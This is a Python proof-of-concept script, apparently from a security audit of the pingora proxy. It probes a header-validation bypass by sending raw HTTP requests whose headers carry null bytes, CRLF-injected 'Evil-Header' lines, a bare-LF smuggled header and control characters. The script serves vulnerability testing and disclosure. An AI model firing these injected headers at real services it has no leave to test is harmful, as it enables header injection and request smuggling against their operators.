#!/usr/bin/env python3
"""
Finding 4 PoC: Header injection via from_maybe_shared_unchecked bypass.

Sends HTTP requests with headers containing null bytes, CR/LF sequences,
and other control characters that should be rejected but pass through
due to the use of from_maybe_shared_unchecked().

Usage:
    python3 repro_header_injection.py --target 127.0.0.1 --port 6188
"""

import argparse
import socket
import sys


def send_raw_request(host: str, port: int, raw_request: bytes) -> bytes:
    """Send a raw HTTP request and return the response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    try:
        sock.connect((host, port))
        sock.sendall(raw_request)
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        return response
    finally:
        sock.close()


def test_null_byte_in_header(host: str, port: int) -> bool:
    """Test if null bytes in header values are accepted."""
    print("\n[Test 1] Null byte in header value")
    request = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"X-Test: before\x00after\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    print(f"  Sending header: X-Test: before\\x00after")
    try:
        response = send_raw_request(host, port, request)
        if response:
            print(f"  Response received ({len(response)} bytes) — header was ACCEPTED")
            print(f"  [!!] Null byte in header value was not rejected!")
            return True
        else:
            print(f"  No response — connection may have been closed (header rejected)")
            return False
    except Exception as e:
        print(f"  Error: {e}")
        return False


def test_crlf_injection(host: str, port: int) -> bool:
    """Test if CRLF sequences in header values enable header injection."""
    print("\n[Test 2] CRLF injection in header value")
    # Embed \r\n inside a header value to inject a second header
    request = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"X-Injected: value\r\nEvil-Header: injected\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    print(f"  Sending header: X-Injected: value\\r\\nEvil-Header: injected")
    try:
        response = send_raw_request(host, port, request)
        if response:
            print(f"  Response received ({len(response)} bytes)")
            print(f"  [!!] CRLF injection was not blocked!")
            print(f"  If upstream receives 'Evil-Header: injected', injection succeeded")
            return True
        else:
            print(f"  No response — header may have been rejected")
            return False
    except Exception as e:
        print(f"  Error: {e}")
        return False


def test_bare_lf_injection(host: str, port: int) -> bool:
    """Test bare LF (without CR) in header value."""
    print("\n[Test 3] Bare LF in header value")
    request = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"X-Test: line1\nX-Smuggled: line2\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    print(f"  Sending header: X-Test: line1\\nX-Smuggled: line2")
    try:
        response = send_raw_request(host, port, request)
        if response:
            print(f"  Response received ({len(response)} bytes)")
            print(f"  [!!] Bare LF in header was accepted!")
            return True
        else:
            print(f"  No response")
            return False
    except Exception as e:
        print(f"  Error: {e}")
        return False


def test_control_chars(host: str, port: int) -> bool:
    """Test various control characters in header values."""
    print("\n[Test 4] Control characters in header values")
    control_chars = [
        (b"\x01", "SOH (0x01)"),
        (b"\x08", "BS (0x08)"),
        (b"\x0b", "VT (0x0b)"),
        (b"\x0c", "FF (0x0c)"),
        (b"\x1b", "ESC (0x1b)"),
        (b"\x7f", "DEL (0x7f)"),
    ]
    
    accepted = []
    for char, name in control_chars:
        request = (
            b"GET / HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"X-Test: a" + char + b"b\r\n"
            b"Connection: close\r\n"
            b"\r\n"
        )
        try:
            response = send_raw_request(host, port, request)
            if response:
                accepted.append(name)
        except Exception:
            pass
    
    if accepted:
        print(f"  [!!] Accepted control characters: {', '.join(accepted)}")
        return True
    else:
        print(f"  [OK] All control characters were rejected")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for header validation bypass via from_maybe_shared_unchecked"
    )
    parser.add_argument("--target", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=6188, help="Target port")
    args = parser.parse_args()

    print(f"Finding 4 PoC: Header Validation Bypass")
    print(f"Target: {args.target}:{args.port}")
    print(f"{'=' * 60}")
    print(f"NOTE: Requires pingora built with 'patched_http1' feature")

    results = {
        "null_byte": test_null_byte_in_header(args.target, args.port),
        "crlf_injection": test_crlf_injection(args.target, args.port),
        "bare_lf": test_bare_lf_injection(args.target, args.port),
        "control_chars": test_control_chars(args.target, args.port),
    }

    print(f"\n{'=' * 60}")
    print("Summary:")
    for test, passed in results.items():
        status = "[VULN]" if passed else "[OK]"
        print(f"  {status} {test}")

    vulns = sum(1 for v in results.values() if v)
    if vulns > 0:
        print(f"\n[!!] {vulns}/{len(results)} tests indicate header validation bypass!")
    else:
        print(f"\n[OK] No bypasses detected (is patched_http1 enabled?)")


if __name__ == "__main__":
    main()
